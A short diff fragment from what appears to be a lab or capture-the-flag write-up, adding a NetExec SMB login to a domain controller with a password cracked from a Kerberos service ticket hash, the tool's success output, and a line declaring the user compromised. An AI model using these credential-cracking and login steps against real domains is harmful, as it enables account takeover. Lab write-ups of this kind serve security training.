@@ -1084,8 +1084,14 @@ $krb5tgs$18$m.mold$TRASK.HSM$7c77c94b611adabc335098d2$cb43925e6ab5f1357ac017c070
 The hash cracked!
 
 ```python
-
+nxc smb dc01.trask.hsm -u m.mold -p '(master-shiny)20' -k                                             
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\m.mold:(master-shiny)20
 ```
+
+This user is now compromised!
+
+
 
 
 
